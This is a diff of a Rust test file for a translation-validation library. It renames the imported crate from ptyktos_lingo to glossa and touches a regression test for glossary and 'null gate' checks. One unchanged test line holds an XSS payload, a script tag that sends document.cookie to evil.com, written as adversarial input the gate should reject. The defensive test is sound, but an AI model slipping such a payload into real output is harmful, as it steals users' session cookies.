@@ -9,19 +9,16 @@
 //! - Enterprise Resource Catalogs: JSON, YAML, PO/POT, Fluent, Properties, XLIFF 1.2/2.0, CSV
 //! - Gate Invariants: Slot preservation, numbered tag conservation, and protected brand glossaries.
 
-use ptyktos_lingo::emitters::resource;
-use ptyktos_lingo::engine::gate::ApeironNullGate;
-use ptyktos_lingo::ir::coord::ApeironCoord;
-use ptyktos_lingo::parsers::code::extract_code_strings;
-use ptyktos_lingo::parsers::html::extract_html;
-use ptyktos_lingo::parsers::jsx::extract_jsx;
-use ptyktos_lingo::parsers::markdown::extract_markdown;
-use ptyktos_lingo::parsers::resource::{
-    extract_android_xml, extract_csv, extract_flutter_arb, extract_fluent, extract_ios_strings,
+use glossa::emitters::resource;
+use glossa::engine::gate::ApeironNullGate;
+use glossa::parsers::code::extract_code_strings;
+use glossa::parsers::jsx::extract_jsx;
+use glossa::parsers::resource::{
+    extract_android_xml, extract_flutter_arb, extract_fluent, extract_ios_strings,
     extract_json, extract_po, extract_properties, extract_xliff, extract_yaml,
 };
-use ptyktos_lingo::parsers::svelte::extract_svelte;
-use ptyktos_lingo::parsers::vue::extract_vue;
+use glossa::parsers::svelte::extract_svelte;
+use glossa::parsers::vue::extract_vue;
 use std::collections::BTreeMap;
 
 // =========================================================================
@@ -482,7 +479,7 @@ fn test_regression_null_gate_and_glossary() {
     // Corrupted brand term (e.g. LLM translated "Apeiron" into "Infini")
     let bad_trans = "Propulsé par Ptyktos sur l'architecture Infini.";
     let err = ApeironNullGate::validate_with_glossary(src, bad_trans, Some(&glossary)).unwrap_err();
-    assert!(matches!(err, ptyktos_lingo::engine::gate::GateViolation::GlossaryViolation { .. }));
+    assert!(matches!(err, glossa::engine::gate::GateViolation::GlossaryViolation { .. }));
 
     // 2. Adversarial XSS Attack caught
     let xss_trans = "¡Bienvenido!<script>fetch('http://evil.com/leak?cookie='+document.cookie)</script>";
